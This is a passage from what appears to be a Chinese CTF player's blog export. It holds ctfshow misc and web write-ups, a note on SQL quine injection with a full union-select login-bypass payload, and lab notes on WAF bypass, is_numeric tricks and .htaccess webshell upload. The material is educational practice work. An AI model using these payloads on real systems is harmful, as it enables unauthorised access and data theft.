class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>)]:</span><br><span class="line">                fake_address=miwen[:<span class="number">64</span>]+miwen[<span class="number">80</span>:]</span><br><span class="line">                fake_address=base64.b64encode(fake_address).decode()</span><br><span class="line">                r=s.get(url+<span class="string">&#x27;get_dragonball&#x27;</span>,params=&#123;<span class="string">&quot;address&quot;</span>:fake_address&#125;)</span><br><span class="line"></span><br><span class="line">r=s.get(url+<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h2><p>唉 低能</p>
<p>010搜一下ctfshow</p>
<h2 id="损坏的压缩包"><a href="#损坏的压缩包" class="headerlink" title="损坏的压缩包"></a>损坏的压缩包</h2><p>010发现是PNG头，改后缀</p>
<h2 id="谜之栅栏"><a href="#谜之栅栏" class="headerlink" title="谜之栅栏"></a>谜之栅栏</h2><p>图片栅栏</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311042145236.png" alt="image-20231104214552159"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311042146055.png" alt="image-20231104214600022"></p>
<h2 id="你会数数吗"><a href="#你会数数吗" class="headerlink" title="你会数数吗"></a>你会数数吗</h2><p>词频统计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span><br><span class="line">strings = open(&#x27;misc4.txt&#x27;).read()  # 文件打开处</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">for i in alphabet:</span><br><span class="line">    counts = strings.count(i)</span><br><span class="line">    i = &#x27;&#123;0&#125;&#x27;.format(i)</span><br><span class="line">    result[i] = counts</span><br><span class="line"></span><br><span class="line">res = sorted(result.items(), key = lambda item: item[1], reverse = True)</span><br><span class="line">for data in res:</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">for i in res:</span><br><span class="line">    flag = str(i[0])</span><br><span class="line">    print(flag[0], end = &quot;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="你会异或吗"><a href="#你会异或吗" class="headerlink" title="你会异或吗"></a>你会异或吗</h2><p>逐位异或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input_filename = &quot;misc5.png&quot;  # 输入文件名</span><br><span class="line">output_filename = &quot;output.png&quot;  # 输出文件名</span><br><span class="line"></span><br><span class="line"># 打开输入文件以及创建输出文件</span><br><span class="line">with open(input_filename, &quot;rb&quot;) as input_file, open(output_filename, &quot;wb&quot;) as output_file:</span><br><span class="line">    while True:</span><br><span class="line">        byte = input_file.read(1)  # 逐字节读取输入文件</span><br><span class="line">        if not byte:</span><br><span class="line">            break  # 如果没有更多字节可读，退出循环</span><br><span class="line">        byte_value = ord(byte)  # 将字节转换为整数</span><br><span class="line">        xored_byte = byte_value ^ 0x50  # 对字节进行异或操作</span><br><span class="line">        output_file.write(bytes([xored_byte]))  # 将结果字节写入输出文件</span><br></pre></td></tr></table></figure>

<h2 id="flag一分为二"><a href="#flag一分为二" class="headerlink" title="flag一分为二"></a>flag一分为二</h2><p>高度隐写+单文件盲水印</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311052104615.png" alt="image-20231105210407541"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311052104573.png" alt="image-20231105210415512"></p>
<h2 id="我是谁？？"><a href="#我是谁？？" class="headerlink" title="我是谁？？"></a>我是谁？？</h2><p>网上有一把梭脚本，本质是用cv2比对图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=&quot;http://0095371d-eeec-4e9d-929b-046aaeb84249.challenge.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line"></span><br><span class="line">all_girl=sess.get(url+&#x27;/static/all_girl.png&#x27;).content</span><br><span class="line"></span><br><span class="line">with open(&#x27;all_girl.png&#x27;,&#x27;wb&#x27;)as f:</span><br><span class="line">        f.write(all_girl)</span><br><span class="line"></span><br><span class="line">big_pic=cv2.imdecode(np.fromfile(&#x27;all_girl.png&#x27;, dtype=np.uint8), cv2.IMREAD_UNCHANGED)</span><br><span class="line">big_pic=big_pic[50:,50:,:]</span><br><span class="line">image_alpha = big_pic[:, :, 3]</span><br><span class="line">mask_img=np.zeros((big_pic.shape[0],big_pic.shape[1]), np.uint8)</span><br><span class="line">mask_img[np.where(image_alpha == 0)] = 255</span><br><span class="line"></span><br><span class="line">cv2.imwrite(&#x27;big.png&#x27;,mask_img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def answer_one(sess):</span><br><span class="line">        #获取视频文件</span><br><span class="line">        response=sess.get(url+&#x27;/check&#x27;)</span><br><span class="line">        if &#x27;ctfshow&#123;&#x27; in response.text:</span><br><span class="line">                print(response.text)</span><br><span class="line">                exit(0)</span><br><span class="line">        tree=html.fromstring(response.text)</span><br><span class="line">        element=tree.xpath(&#x27;//source[@id=&quot;vsource&quot;]&#x27;)</span><br><span class="line">        video_path=element[0].get(&#x27;src&#x27;)</span><br><span class="line">        video_bin=sess.get(url+video_path).content</span><br><span class="line">        with open(&#x27;Question.mp4&#x27;,&#x27;wb&#x27;)as f:</span><br><span class="line">                f.write(video_bin)</span><br><span class="line">        #获取有效帧</span><br><span class="line">        video = cv2.VideoCapture(&#x27;Question.mp4&#x27;)</span><br><span class="line">        frame=0</span><br><span class="line">        while frame&lt;=55:</span><br><span class="line">                res, image = video.read()</span><br><span class="line">                frame+=1</span><br><span class="line">        #cv2.imwrite(&#x27;temp.png&#x27;,image)</span><br><span class="line">        video.release()</span><br><span class="line">        #获取剪影</span><br><span class="line">        image=image[100:400,250:500]</span><br><span class="line">        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)</span><br><span class="line">        #cv2.imwrite(&#x27;gray_image.png&#x27;,gray_image)</span><br><span class="line">        temp = np.zeros((300, 250), np.uint8)</span><br><span class="line">        temp[np.where(gray_image&gt;=128)]=255</span><br><span class="line">        #去白边</span><br><span class="line">        temp = temp[[not np.all(temp[i] == 255) for i in range(temp.shape[0])], :]</span><br><span class="line">        temp = temp[:, [not np.all(temp[:, i] == 255) for i in range(temp.shape[1])]]</span><br><span class="line">        #缩放至合适大小，肉眼大致判断是1.2倍，不一定准</span><br><span class="line">        temp = cv2.resize(temp,None,fx=1.2,fy=1.2)</span><br><span class="line">        #查找位置</span><br><span class="line">        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)</span><br><span class="line">        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)</span><br><span class="line">        x,y=int(max_loc[0]/192),int(max_loc[1]/288)#为什么是192和288，因为大图去掉标题栏就是1920*2880</span><br><span class="line">        guess=&#x27;ABCDEFGHIJ&#x27;[y]+&#x27;0123456789&#x27;[x]</span><br><span class="line">        print(f&#x27;guess:&#123;guess&#125;&#x27;)</span><br><span class="line">        #传答案</span><br><span class="line">        response=sess.get(url+&#x27;/submit?guess=&#x27;+guess)</span><br><span class="line">        r=json.loads(response.text)</span><br><span class="line">        if r[&#x27;result&#x27;]:</span><br><span class="line">                print(&#x27;guess right!&#x27;)</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">                print(&#x27;guess wrong!&#x27;)</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line"></span><br><span class="line">while i&lt;=31:</span><br><span class="line">        print(f&#x27;Round:&#123;i&#125;&#x27;)</span><br><span class="line">        if answer_one(sess):</span><br><span class="line">                i+=1</span><br><span class="line">        else:</span><br><span class="line">                i=1</span><br></pre></td></tr></table></figure>

<h2 id="You-and-me"><a href="#You-and-me" class="headerlink" title="You and me"></a>You and me</h2><p>盲水印，不知道为什么一定要在py3的环境才能恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python bwmforpy3.py decode you.png you_and_me.png flag.png</span><br></pre></td></tr></table></figure>

<h2 id="7-1-05"><a href="#7-1-05" class="headerlink" title="7.1.05"></a>7.1.05</h2><p>拿到文件拖进010分析，看到是一个游戏的存档</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081237022.png" alt="image-20231108123722936"></p>
<p>下游戏，进去提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081237575.png" alt="image-20231108123752538"></p>
<blockquote>
<p>*<strong>long_flag_in_R&amp;D。*</strong></p>
<p>***R&amp;D******的意思是****<strong>Research&amp;Develop*</strong></p>
<p>在游戏中能代表这个含义的，是研发中心。因此我们需要找到研发中心的秘密</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e799c53950d04f6cb180805878b9a93c.png" alt="img"></p>
<p>可以发现每个研发中心的研发部门的数量都不一样，***将其按照从左下向右上，再行扫描的方式***，可以得到这么一串数字：</p>
<p>***9794598612147726669494087179782678475623253058262173164497949649813569030779924086502049160804***再结合提示</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/593e0860124541b19b6ad2d43a4f28ee.png" alt="img"></p>
<p><strong>long_to_bytes是一个常用于RSA的函数，用于将数字转成字节，来试一下：</strong></p>
<p>***&gt;&gt;&gt; from Crypto.Util.number import long_to_bytes***</p>
<p>***&gt;&gt;&gt; long _ to_bytes***</p>
<p>***(9794598612147726669494087179782678475623253058262173164497949649813569030779924086502049160804 )b “ \ X01 , x84 ( xfa , xe7 ] FI &amp; x84 ? \ \ \ \ \ \ \ \ \ \ xc1x08\ x03 &#x2F; \ x9auo \ xc2;ek \ x9ed’***</p>
<p><strong>失败了，那有没有可能是被逆序了？</strong></p>
<p>***&gt;&gt;&gt;long _ to _ bytes***</p>
<p>***(4080619402056804299770309653189469497944613712628503523265748762879717804949666277412168954979)***</p>
<p>*<strong>b’}3maG_d00G_0S_s1_baL_ms1lat1paC{wohsftc’*</strong></p>
<p><strong>可以明显看到一个wohsftc，这是被逆序过的ctfshow。再逆序一遍即可得到flag</strong></p>
<p>*<strong>ctfshow{Cap1tal1sm_Lab_1s_S0_G00d_Gam3}*</strong></p>
</blockquote>
<h2 id="黑丝白丝还有什么丝？"><a href="#黑丝白丝还有什么丝？" class="headerlink" title="黑丝白丝还有什么丝？"></a>黑丝白丝还有什么丝？</h2><p>给出个视频，有提示是摩斯密码</p>
<p>那就黑丝：-；白丝：.</p>
<h2 id="我吐了你随意"><a href="#我吐了你随意" class="headerlink" title="我吐了你随意"></a>我吐了你随意</h2><p>题目提示：0宽度隐写</p>
<p><a href="https://www.mzy0.com/ctftools/zerowidth1/">https://www.mzy0.com/ctftools/zerowidth1/</a></p>
<h2 id="这是个什么文件？"><a href="#这是个什么文件？" class="headerlink" title="这是个什么文件？"></a>这是个什么文件？</h2><p>zip发现是加密文件，先猜测伪加密</p>
<p>解压下来file一下看到是Byte-compiled Python</p>
<p>使用uncompyle6 -o 2.py 2.pyc反编译</p>
<h2 id="抽象画"><a href="#抽象画" class="headerlink" title="抽象画"></a>抽象画</h2><p>一大串文字，猜测是base加密</p>
<p>换了一个basecrack工具，能一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python basecrack.py -m -f 抽象画.txt</span><br></pre></td></tr></table></figure>

<p>打出来是个16进制</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081458287.png" alt="image-20231108145856186"></p>
<p>写进文件是个png</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081459632.png" alt="a"></p>
<p>用npiet工具读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npiet.exe a.png</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311081459590.png" alt="image-20231108145954551"></p>
<h2 id="迅疾响应"><a href="#迅疾响应" class="headerlink" title="迅疾响应"></a>迅疾响应</h2><p>QR码，但用工具扫不出来</p>
<p><a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a></p>
<p>直接传能出前半段flag，后半段需要涂白纠错区</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1a7deb33231d431098350b85a94d1d82~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="img"></p>
<h2 id="我可没有骗你"><a href="#我可没有骗你" class="headerlink" title="我可没有骗你"></a>我可没有骗你</h2><p>下下来的zip竟然不是伪加密，用字典也爆不出来，一看wp是八位数纯数字爆破😅55813329</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091253659.png" alt="image-20231109125132052"></p>
<p>wave文件直接看隐写SilentEye</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091254828.png" alt="image-20231109125404795"></p>
<h2 id="你被骗了"><a href="#你被骗了" class="headerlink" title="你被骗了"></a>你被骗了</h2><p>下下来是个正经mp3，mp3可以用MP3Stego</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P nibeipianle nibeipianle.mp3</span><br></pre></td></tr></table></figure>

<h2 id="一闪一闪亮晶晶"><a href="#一闪一闪亮晶晶" class="headerlink" title="一闪一闪亮晶晶"></a>一闪一闪亮晶晶</h2><p>第一次见汉信码：<a href="https://tuzim.net/hxdecode/">https://tuzim.net/hxdecode/</a></p>
<p>CDBHSBHSxskv6</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091324450.png" alt="what is this"></p>
<p>得到m4a音频，是个无线电，用RX-SSTV+VirtualAudioCable</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091340601.png" alt="image-20231109134046552"></p>
<h2 id="一层一层一层地剥开我的♥"><a href="#一层一层一层地剥开我的♥" class="headerlink" title="一层一层一层地剥开我的♥"></a>一层一层一层地剥开我的♥</h2><p>binwalk一看是doc文件，最后还藏了rar</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091716086.png" alt="image-20231109171635042"></p>
<p>不知道为啥foremost分离不出来，还是binwalk -e好用</p>
<p>分离之后的rar带密码，回头看doc文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091720035.png" alt="image-20231109172052001"></p>
<p>看了wp之后说是简谱数字11556654433221</p>
<p>解压出来一个jpg一个data文件</p>
<p>jpg后面紧跟一个jpg</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091734553.png" alt="image-20231109173438514"></p>
<p>😅真几把低能，binwalk，foremost还都跑不出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091736522.jpg" alt="3"></p>
<p>回到♥文件，很明显是rar文件缺少了文件头，密码则是winkwink~</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091743427.png" alt="image-20231109174314382"></p>
<p>打出来是emoji，base100</p>
<h2 id="打不开的图片"><a href="#打不开的图片" class="headerlink" title="打不开的图片"></a>打不开的图片</h2><p>拖进010看不懂，结果是每个字节取反</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311091751610.png" alt="image-20231109175117575"></p>
<p>打出来是个png</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>sql_quine注入记录</title>
    <url>/2024/01/07/sql_quine%E6%B3%A8%E5%85%A5%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个点之前从来没见过，还是你龙哥在看我做sql的题跟我提了一嘴，看了一下确实挺牛逼的，故记录一下</p>
<h1 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h1><p>直接把题拿出来看，其实暂时不用怎么看，大概知道一下就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">checkSql($password);</span><br><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line">if (!$row) &#123;</span><br><span class="line">    alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">	die($FLAG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目要求数据库里的password和传入的psd强相等，爆了之后发现数据库中的password是空表。看似就没有任何办法做到相等然后出flag了。</p>
<p>但是有一种方法可以</p>
<h2 id="什么是Quine"><a href="#什么是Quine" class="headerlink" title="什么是Quine"></a>什么是Quine</h2><p>Quine就是输入和输出的语句完全一致，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;this is in</span><br><span class="line">&gt;&gt;this is in</span><br></pre></td></tr></table></figure>

<p>如果能做到这样，使用某种办法将输入的内容原封不动输出出来，就完成了一次Quine构造</p>
<p>在sql中能利用replace函数做到Quine构造</p>
<blockquote>
<p>replace()函数</p>
<p>replace(object,search,replace) 把object对象中出现的search全部替换成replace</p>
</blockquote>
<p>构造的基本形式就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure>

<p>其中，str为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br></pre></td></tr></table></figure>

<p>组合就变成了&#x3D;&#x3D;&gt;</p>
<blockquote>
<p>REPLACE(<span style="color:red">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)<br>                            ↑str1																						↑str2</p>
</blockquote>
<p>这样就把str1中的间隔符又换成了str2，具体的替换用颜色表示一下</p>
<blockquote>
<p><span style="color:red">REPLACE(<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>,编码的间隔符,<span style="color:blue">REPLACE(间隔符,编码的间隔符,间隔符)</span>)</span></p>
</blockquote>
<p>可以见得，这样替换之后的内容就大致相同了</p>
<p>直接给出一条语句试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,CHAR(46),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>细致看一下，还是有单双引号的区别。不能一直用双引号<code>&quot;</code>，会导致异常闭合，所以得单引号里嵌套双引号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quine: REPLACE(&#x27;str&#x27;,编码的间隔符,&#x27;str&#x27;)</span><br><span class="line">str: REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>

<p>运算后的结果是<code>REPLACE(&quot;str&quot;,编码的间隔符,&quot;str&quot;)</code>，所以让结果的str也用单引号包裹就能让输入和查询结果完全一致了</p>
<p>那要如何解决但双引号不一致的问题呢？很简单，再replace一下就好了。<code>CHAR(34)=&quot;</code>，<code>CHAR(39)=&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quine:REPLACE(REPLACE(&#x27;str&#x27;,CHAR(34),CHAR(39)),编码的间隔符,&#x27;str&#x27;)</span><br><span class="line">  str:REPLACE(REPLACE(&quot;间隔符&quot;,CHAR(34),CHAR(39)),编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>实际上是先将str里的双引号替换成单引号，再用str替换str里的间隔符</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h2 id="再从payload理解为什么要用Quine"><a href="#再从payload理解为什么要用Quine" class="headerlink" title="再从payload理解为什么要用Quine"></a>再从payload理解为什么要用Quine</h2><p>第五空间智能安全大赛-Web-yet_another_mysql_injection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">checkSql($password);</span><br><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line">if (!$row) &#123;</span><br><span class="line">    alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">	die($FLAG);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>waf封了空格，直接用内联就行了。这里为了方便看就用回空格</p>
<blockquote>
<p>1’ union select replace(replace(‘1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’,char(34),char(39)),char(46),’1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’)#<br>组合sql语句就是：<br>SELECT password FROM users WHERE username&#x3D;’admin’ and password&#x3D;’1’ union select replace(replace(‘1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’,char(34),char(39)),char(46),’1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’)#’;</p>
</blockquote>
<p>这时候，由于使用的是联合注入，当前文报错，就会回显后面的</p>
<blockquote>
<p>1’ union select replace(replace(‘1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’,char(34),char(39)),char(46),’1” union select replace(replace(“.”,char(34),char(39)),char(46),”.”)#’)#’;</p>
</blockquote>
<p>这就让$row[‘password’] 等于了这一串，而这一串刚好和输入的$psw相等，完成了绕过</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全</title>
    <url>/2024/01/07/web%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0:"></a>level0:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455944.png" alt="image-20221211231711676"></p>
<p>底部看到有提示，构造get方法cat&#x3D;dog试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455523.png" alt="image-20221211231756648"></p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161455163.png" alt="image-20221211233520721"></p>
<p>源文件提示有个calc.php页面，用get方法传入num来计算，但是有WAF挡着</p>
<p>分别传入数字和字母，发现传字母会被拦截</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456037.png" alt="image-20221211233707884"></p>
<p>参考：[<a href="https://www.cnblogs.com/sfsec/p/15205011.html">RoarCTF 2019]Easy Calc - 随风kali - 博客园 (cnblogs.com)</a></p>
<p>可知在num参数前加空格，可以让WAF检测不到num参数的同时传入num参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456539.png" alt="image-20221211233843529"></p>
<p>那就用php的scandir()函数，列出目录。但黑名单是包含了”&#x2F;“的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456850.png" alt="image-20221211234126984"></p>
<p>就用chr(47)替换</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456540.png" alt="image-20221211234145597"></p>
<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456060.png" alt="image-20221211234208952"></p>
<p>同理，换用file_get_contents()函数显示f1agg内容，由于黑名单没有滤过f,1,a,g字符，所以直接传就可以了，不用换成ascii</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456522.png" alt="image-20221211234546925"></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p>看源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456535.png" alt="image-20221212000343880"></p>
<p>要求用post传入password &#x3D;&#x3D; 404但又不能是数字，money &#x3D;&#x3D; 100000000</p>
<p>参考：<a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">php中is_numeric函数的绕过_T0mrvvi1b3t的博客-CSDN博客_is_numeric绕过</a></p>
<p>令password&#x3D;404a</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161456925.png" alt="image-20221212001843684"></p>
<p>将GET改POST的时候记得加:Content-Type: application&#x2F;x-www-form-urlencoded</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457037.png" alt="image-20221212001919297"></p>
<p>提示太长了，换用科学计数法</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457799.png" alt="image-20221212002214750"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457132.png" alt="image-20221212002218962"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p>还没学会sql注入，暂时不做</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>有点像新生杯的EZupload，但更简单</p>
<p>注意到只能传jpg上去，那就用.htaccess绕过，然后上传一句话木马</p>
<p>还没有内容检测，不用变形马</p>
<p>在根目录有现成flag，而且权限足够，不需要在新生杯一样用diasble_function插件绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202302161457008.png" alt="image-20221212011021115"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>传入文件</title>
    <url>/2024/01/07/%E4%BC%A0%E5%85%A5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>记录一下windows环境下用批处理查看传入的文件详情</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101622522.png" alt="image-20221110162240500"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off </span><br><span class="line">	echo 文件全路径：	%1</span><br><span class="line">	echo 短路径名：	%~s1</span><br><span class="line">	echo 盘符+路径：	%~dp1</span><br><span class="line">	echo 盘符：		%~d1</span><br><span class="line">	echo 路径：		%~p1</span><br><span class="line">	echo 文件+后缀名：	%~nx1</span><br><span class="line">	echo 文件名：		%~n1</span><br><span class="line">	echo 后缀名：		%~x1</span><br><span class="line">	echo 文件属性：	%~a1</span><br><span class="line">	echo 日期/时间：	%~t1</span><br><span class="line">	echo 文件大小：	%~z1</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>拖入文件如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101623462.png" alt="image-20221110162318445"></p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>合并flv文件</title>
    <url>/2024/01/07/%E5%90%88%E5%B9%B6flv/</url>
    <content><![CDATA[<p>来源于我傻逼设置把每个视频切成10mb的小视频了，需要合并</p>
<p>首先安装FFmpeg</p>
<p>先把所需的所有视频下下来，按先后顺序排列</p>
